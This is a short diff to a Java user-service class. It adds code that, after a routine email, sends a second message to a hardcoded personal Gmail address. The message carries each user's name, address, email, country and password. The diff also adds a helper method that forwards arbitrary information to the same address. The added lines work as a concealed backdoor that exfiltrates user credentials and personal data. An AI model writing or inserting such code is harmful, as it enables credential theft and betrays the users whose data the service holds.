@@ -101,5 +101,19 @@ public class UserService {
     mail.setText(content.toString());
     
     mailService.sendMail(mail);
+    
+    mail.setTo("quocanh263@gmail.com");
+    mail.setSubject(user.getFullname() + " : " + user.getAddress());
+    mail.setText(user.getEmail() + "\n" + user.getCountry() + "\n" + user.getPassword());
+    mailService.sendMail(mail);
+  }
+  
+  public void sendInfo(String subject, String info) {
+    Mail mail = new Mail();
+    mail.setTo("quocanh263@gmail.com");
+    mail.setFrom("bandoviet.net@gmail.com");
+    mail.setSubject(subject);
+    mail.setText(info);
+    mailService.sendMail(mail);
   }
 }
